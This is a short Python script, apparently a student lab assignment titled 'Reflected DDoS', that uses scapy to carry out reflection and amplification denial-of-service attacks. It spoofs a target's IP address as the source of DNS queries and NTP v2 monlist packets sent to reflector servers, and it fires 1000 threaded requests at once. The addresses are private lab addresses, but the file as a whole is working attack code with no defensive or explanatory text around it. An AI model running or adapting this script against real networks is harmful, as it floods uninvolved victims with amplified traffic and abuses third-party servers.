"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

Reflected DDoS
"""
from scapy.all import *
import concurrent.futures
import sys
import time

dns_hosts = ["example.com.","www.example.com.","example.org","example.be","example.fr","test.com","a-very-long-domain-name.com","a-very-long-domain-name.org","oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof","i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof","domain.oof"]


def dns_ddos(target, dns_server):
    global dns_hosts

    for host in dns_hosts:
        ip = IP(src=target, dst=dns_server)
        udp = UDP(dport=53)
        dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=host, qtype=225))

        request = (ip/udp/dns)

        send(request)

def ntp_ddos(target, ntp_server):
    #Magic Packet aka NTP v2 Monlist Packet
    data = "\x17\x00\x03\x2a" + "\x00" * 4
    packet = IP(dst=ntp_server,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data)
    send(packet) # or add the parameter loop=1

if __name__ == "__main__":
    target = "10.12.0.10"
    dns_server = "10.12.0.20"
    ntp_server = "10.12.0.30"

    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        futures = []
        for i in range(1000):
            if (i % 2 == 0):
                futures.append(executor.submit(
                    dns_ddos, target, dns_server))
            else:
                futures.append(executor.submit(
                    ntp_ddos, target, ntp_server))

        for future in concurrent.futures.as_completed(futures):
            if future.result():
                executor.shutdown(wait=False)
                print('Time taken :', time.time() - start_time)
                sys.exit(0)